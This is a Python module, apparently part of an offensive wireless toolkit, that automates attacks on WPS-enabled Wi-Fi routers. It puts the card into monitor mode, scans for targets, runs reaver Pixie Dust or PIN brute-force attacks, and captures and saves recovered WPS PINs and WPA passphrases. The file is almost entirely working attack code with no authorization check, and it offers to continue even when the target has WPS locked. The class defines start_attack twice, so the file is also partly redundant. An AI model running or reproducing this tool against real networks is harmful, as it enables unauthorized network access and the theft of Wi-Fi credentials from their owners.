#!/usr/bin/env python3

from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import subprocess
import threading
import time
import signal
import os
import re
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    scan_networks,
    select_target,
    get_data_path,
    log_activity,
    get_temp_path,
    cleanup_temp_files
)
from datetime import datetime
from scapy.all import *
from threading import Thread

class WPSAttacker:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.running = False
        self.pin_found = False
        self.current_pin = None
        self.status_thread = None
        self.start_time = None
        self.pins_tested = 0
        self.attack_process = None

    def cleanup(self):
        """Clean up resources and restore interface state"""
        try:
            self.running = False
            if self.status_thread and self.status_thread.is_alive():
                self.status_thread.join(timeout=1)
            if self.attack_process:
                self.attack_process.terminate()
                time.sleep(1)
            if self.interface:
                subprocess.run(['airmon-ng', 'stop', self.interface], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
        except Exception as e:
            self.console.print(f"[red]Error during cleanup: {str(e)}[/red]")

    def get_interface(self):
        """Get available wireless interfaces with improved detection"""
        try:
            interfaces = []
            
            # Method 1: iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)

            # Method 2: iw dev
            if not interfaces:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split('Interface')[1].strip()
                        interfaces.append(iface)

            # Method 3: Check /sys/class/net for wireless devices
            if not interfaces:
                for iface in os.listdir('/sys/class/net'):
                    if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                        interfaces.append(iface)

            if not interfaces:
                self.console.print("[red]No wireless interfaces found![/red]")
                self.console.print("[yellow]Please ensure your wireless adapter is connected and recognized.[/yellow]")
                return None

            # Display available interfaces in a table
            table = Table(title="Available Wireless Interfaces")
            table.add_column("Index", style="cyan")
            table.add_column("Interface", style="green")
            table.add_column("Status", style="yellow")

            for idx, iface in enumerate(interfaces, 1):
                # Get interface status
                status = "Unknown"
                try:
                    result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
                    if 'Mode:Monitor' in result.stdout:
                        status = "Monitor Mode"
                    elif 'Mode:Managed' in result.stdout:
                        status = "Managed Mode"
                except:
                    pass
                table.add_row(str(idx), iface, status)

            self.console.print(table)

            while True:
                try:
                    choice = int(input("\nSelect interface number: ")) - 1
                    if 0 <= choice < len(interfaces):
                        return interfaces[choice]
                except ValueError:
                    pass
                self.console.print("[red]Invalid choice. Please try again.[/red]")

        except Exception as e:
            self.console.print(f"[red]Error detecting wireless interfaces: {str(e)}[/red]")
            return None

    def scan_networks(self):
        """Scan for networks with WPS enabled"""
        try:
            networks = []
            temp_file = get_temp_path('wps_scan')
            
            # Start wash scan
            scan_process = subprocess.Popen(
                ['wash', '-i', self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Show progress while scanning
            with Progress() as progress:
                task = progress.add_task("[cyan]Scanning for WPS-enabled networks...", total=100)
                
                for i in range(20):  # Scan for 20 seconds
                    progress.update(task, advance=5)
                    
                    # Read output without blocking
                    while True:
                        line = scan_process.stdout.readline()
                        if not line:
                            break
                            
                        if '|' in line:  # Valid network line
                            parts = line.strip().split('|')
                            if len(parts) >= 5:
                                bssid = parts[0].strip()
                                channel = parts[1].strip()
                                wps_version = parts[2].strip()
                                wps_locked = parts[3].strip()
                                essid = parts[4].strip()
                                
                                if bssid and essid:
                                    networks.append({
                                        'BSSID': bssid,
                                        'Channel': channel,
                                        'ESSID': essid,
                                        'WPS Version': wps_version,
                                        'WPS Locked': wps_locked == 'Yes'
                                    })
                    
                    time.sleep(1)
                
                scan_process.terminate()
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error during WPS scan: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Select target network with improved UI"""
        if not networks:
            self.console.print("[red]No WPS-enabled networks found![/red]")
            return False

        # Display networks
        table = Table(title="WPS-Enabled Networks")
        table.add_column("Index", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("Channel", justify="center")
        table.add_column("ESSID", style="yellow")
        table.add_column("WPS Version", justify="center")
        table.add_column("Status", style="red")

        for idx, network in enumerate(networks, 1):
            table.add_row(
                str(idx),
                network['BSSID'],
                network['Channel'],
                network['ESSID'],
                network['WPS Version'],
                "Locked" if network['WPS Locked'] else "Unlocked"
            )

        self.console.print(table)

        while True:
            try:
                choice = int(input("\nSelect target network number: ")) - 1
                if 0 <= choice < len(networks):
                    target = networks[choice]
                    if target['WPS Locked']:
                        self.console.print("[yellow]Warning: WPS is locked on this network. Attack may not be successful.[/yellow]")
                        if input("Continue anyway? (y/n): ").lower() != 'y':
                            return False
                    self.target_bssid = target['BSSID']
                    self.target_channel = target['Channel']
                    self.target_essid = target['ESSID']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice. Please try again.[/red]")

        return False

    def display_status(self):
        """Display attack status with improved metrics"""
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                rate = self.pins_tested / elapsed if elapsed > 0 else 0
                
                self.console.clear()
                self.console.print("\n[bold cyan]WPS Attack Status:[/bold cyan]")
                self.console.print(f"Target BSSID: {self.target_bssid}")
                self.console.print(f"Target ESSID: {self.target_essid}")
                self.console.print(f"Channel: {self.target_channel}")
                if self.current_pin:
                    self.console.print(f"Current PIN: {self.current_pin}")
                self.console.print(f"PINs Tested: {self.pins_tested}")
                self.console.print(f"Duration: {int(elapsed)}s")
                self.console.print(f"Rate: {rate:.2f} PINs/min")
                self.console.print("\n[yellow]Press Ctrl+C to stop[/yellow]")
                
                time.sleep(1)
            except:
                break

    def parse_reaver_output(self, line):
        """Parse reaver output for status updates"""
        try:
            # Check for PIN attempts
            pin_match = re.search(r'Trying PIN \"(\d+)\"', line)
            if pin_match:
                self.current_pin = pin_match.group(1)
                self.pins_tested += 1
                return

            # Check for successful PIN
            if "WPS PIN:" in line:
                pin = re.search(r'WPS PIN: (\d+)', line)
                if pin:
                    self.pin_found = True
                    self.current_pin = pin.group(1)
                    return

            # Check for WPA PSK
            if "WPA PSK:" in line:
                psk = re.search(r'WPA PSK: \'(.+?)\'', line)
                if psk:
                    self.console.print(f"\n[green]WPA PSK found: {psk.group(1)}[/green]")
                    return

        except Exception as e:
            pass

    def start_attack(self):
        """Start WPS attack with improved reliability"""
        try:
            # Get interface
            self.interface = self.get_interface()
            if not self.interface:
                return

            # Scan for networks
            self.console.print("\n[cyan]Scanning for WPS-enabled networks...[/cyan]")
            networks = self.scan_networks()
            
            # Select target
            if not self.select_target(networks):
                return

            # Get attack options
            self.console.print("\n[cyan]Attack Options:[/cyan]")
            self.console.print("1. Pixie Dust attack (faster but may not work)")
            self.console.print("2. PIN bruteforce (slower but more reliable)")
            
            while True:
                try:
                    choice = int(input("\nSelect attack type: "))
                    if choice in [1, 2]:
                        break
                except ValueError:
                    pass
                self.console.print("[red]Invalid choice. Please try again.[/red]")

            # Create output directory for this attack
            output_dir = get_data_path('wps', f'attack_{self.target_bssid.replace(":", "")}')
            os.makedirs(output_dir, exist_ok=True)

            # Prepare attack command
            if choice == 1:
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', self.target_bssid,
                    '-c', self.target_channel,
                    '-K', '1',  # Pixie Dust attack
                    '-vv',  # Verbose output
                    '-s', os.path.join(output_dir, 'session.txt')  # Session file
                ]
            else:
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', self.target_bssid,
                    '-c', self.target_channel,
                    '-vv',  # Verbose output
                    '-s', os.path.join(output_dir, 'session.txt')  # Session file
                ]

            # Start attack
            self.console.print("\n[green]Starting WPS attack...[/green]")
            self.console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
            
            self.running = True
            self.start_time = time.time()
            self.pins_tested = 0
            
            # Start status display thread
            self.status_thread = threading.Thread(target=self.display_status)
            self.status_thread.daemon = True
            self.status_thread.start()

            # Start attack process
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Monitor attack output
            while self.running:
                line = self.attack_process.stdout.readline()
                if not line:
                    break
                
                self.parse_reaver_output(line)
                
                if self.pin_found:
                    self.console.print("\n[green]WPS PIN found![/green]")
                    self.console.print(f"[green]PIN: {self.current_pin}[/green]")
                    
                    # Save results
                    with open(os.path.join(output_dir, 'results.txt'), 'w') as f:
                        f.write(f"Target Network: {self.target_essid}\n")
                        f.write(f"BSSID: {self.target_bssid}\n")
                        f.write(f"Channel: {self.target_channel}\n")
                        f.write(f"WPS PIN: {self.current_pin}\n")
                        f.write(f"Attack Duration: {int(time.time() - self.start_time)} seconds\n")
                        f.write(f"PINs Tested: {self.pins_tested}\n")
                    break

            if not self.pin_found:
                self.console.print("\n[yellow]No WPS PIN found.[/yellow]")
                # Save attack information even if unsuccessful
                with open(os.path.join(output_dir, 'attack_info.txt'), 'w') as f:
                    f.write(f"Target Network: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Channel: {self.target_channel}\n")
                    f.write(f"Attack Duration: {int(time.time() - self.start_time)} seconds\n")
                    f.write(f"PINs Tested: {self.pins_tested}\n")
                    f.write("Attack Result: No PIN found\n")

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
        finally:
            self.cleanup()

    def _check_wireless_tools(self):
        """Check if required wireless tools are available"""
        try:
            subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['reaver', '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except FileNotFoundError:
            self.console.print("[red]Error: Required tools not found. Please install wireless-tools and reaver.[/red]")
            return False
            
    def _get_interface(self):
        """Get wireless interface from user"""
        try:
            # Get list of wireless interfaces
            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            interfaces = []
            
            for line in result.stdout.decode().split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
                    
            if not interfaces:
                self.console.print("[red]No wireless interfaces found![/red]")
                return None
                
            # Create selection table
            table = Table(title="Available Wireless Interfaces")
            table.add_column("Option", style="cyan", justify="right")
            table.add_column("Interface", style="green")
            
            for i, interface in enumerate(interfaces, 1):
                table.add_row(str(i), interface)
                
            self.console.print(table)
            
            while True:
                try:
                    choice = int(input("\nSelect interface: "))
                    if 1 <= choice <= len(interfaces):
                        return interfaces[choice-1]
                    else:
                        self.console.print("[red]Invalid choice. Please try again.[/red]")
                except ValueError:
                    self.console.print("[red]Invalid input. Please enter a number.[/red]")
                    
        except Exception as e:
            self.console.print(f"[red]Error getting wireless interfaces: {str(e)}[/red]")
            return None
            
    def _enable_monitor_mode(self):
        """Enable monitor mode on selected interface"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Start monitor mode
            result = subprocess.run(['airmon-ng', 'start', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Check if monitor mode is enabled
            check = subprocess.run(['iwconfig', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if 'Mode:Monitor' in check.stdout.decode():
                return True
                
            # If interface name changed, update it
            for line in result.stdout.decode().split('\n'):
                if '(monitor mode enabled on' in line:
                    self.interface = line.split('on')[1].strip().strip(')')
                    return True
                    
            return False
            
        except Exception as e:
            self.console.print(f"[red]Error enabling monitor mode: {str(e)}[/red]")
            return False
            
    def _scan_for_wps_networks(self):
        """Scan for networks with WPS enabled"""
        networks = []
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                try:
                    bssid = pkt[Dot11].addr2
                    ssid = pkt[Dot11Elt].info.decode()
                    channel = int(ord(pkt[Dot11Elt:3].info))
                    signal = -(256-ord(pkt.notdecoded[-4:-3]))
                    
                    # Check for WPS support
                    wps = False
                    for element in pkt[Dot11Elt:]:
                        if element.ID == 221 and element.info.startswith(b'\x00P\xf2\x04'):
                            wps = True
                            break
                            
                    if wps and bssid not in [n['bssid'] for n in networks]:
                        networks.append({
                            'ssid': ssid,
                            'bssid': bssid,
                            'channel': channel,
                            'signal': signal
                        })
                        
                except:
                    pass
                    
        # Start channel hopping
        def channel_hopper():
            channel = 1
            while self.running:
                try:
                    subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    channel = channel % 14 + 1
                    time.sleep(0.5)
                except:
                    continue
                    
        self.running = True
        hopper = Thread(target=channel_hopper)
        hopper.daemon = True
        hopper.start()
        
        # Scan for networks
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning for WPS networks...", total=None)
            sniff(iface=self.interface, prn=packet_handler, timeout=20)
            
        self.running = False
        
        return networks
        
    def _get_target_network(self, networks):
        """Let user select target network"""
        if not networks:
            self.console.print("[yellow]No WPS-enabled networks found![/yellow]")
            return None
            
        table = Table(title="WPS-Enabled Networks")
        table.add_column("Option", style="cyan", justify="right")
        table.add_column("SSID", style="green")
        table.add_column("BSSID", style="yellow")
        table.add_column("Channel", justify="right", style="blue")
        table.add_column("Signal", justify="right", style="red")
        
        for i, network in enumerate(networks, 1):
            table.add_row(
                str(i),
                network['ssid'],
                network['bssid'],
                str(network['channel']),
                str(network['signal']) + " dBm"
            )
            
        self.console.print(table)
        
        while True:
            try:
                choice = int(input("\nSelect target network: "))
                if 1 <= choice <= len(networks):
                    return networks[choice-1]
                else:
                    self.console.print("[red]Invalid choice. Please try again.[/red]")
            except ValueError:
                self.console.print("[red]Invalid input. Please enter a number.[/red]")
                
    def start_attack(self):
        """Start WPS analysis"""
        try:
            # Check requirements
            if not self._check_wireless_tools():
                return
                
            # Get wireless interface
            self.interface = self._get_interface()
            if not self.interface:
                return
                
            # Enable monitor mode
            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
            if not self._enable_monitor_mode():
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return
                
            self.console.print("[green]Monitor mode enabled successfully![/green]")
            
            # Scan for WPS networks
            networks = self._scan_for_wps_networks()
            target = self._get_target_network(networks)
            
            if not target:
                return
                
            # Start WPS analysis
            self.console.print(f"\n[yellow]Starting WPS analysis on {target['ssid']}...[/yellow]")
            
            # Set channel
            subprocess.run(['iwconfig', self.interface, 'channel', str(target['channel'])],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         
            # Create output directory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                    'data', 'wps')
            os.makedirs(output_dir, exist_ok=True)
            
            # Start reaver
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target['bssid'],
                '-c', str(target['channel']),
                '-vv',
                '-K', '1',  # Test if WPS is locked
                '-o', os.path.join(output_dir, f'wps_{timestamp}.txt')
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            
            # Monitor output
            with Progress() as progress:
                task = progress.add_task("[cyan]Running WPS analysis...", total=None)
                
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None:
                        break
                        
                    if "WPS PIN:" in line:
                        self.console.print(f"\n[green]{line.strip()}[/green]")
                    elif "WPS locked" in line:
                        self.console.print("\n[red]WPS is locked![/red]")
                        break
                    elif "AP rate limited" in line:
                        self.console.print("\n[yellow]AP is rate limiting WPS attempts[/yellow]")
                        break
                        
            # Log results
            log_path = os.path.join(output_dir, f'analysis_{timestamp}.txt')
            with open(log_path, 'w') as f:
                f.write(f"WPS Analysis Log\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target SSID: {target['ssid']}\n")
                f.write(f"Target BSSID: {target['bssid']}\n")
                f.write(f"Channel: {target['channel']}\n")
                f.write(f"Signal Strength: {target['signal']} dBm\n")
                
            self.console.print(f"\n[green]Analysis log saved to: {log_path}[/green]")
            
        except Exception as e:
            self.console.print(f"[red]Error during WPS analysis: {str(e)}[/red]")
            
        finally:
            # Cleanup
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            
            input("\nPress Enter to continue...") 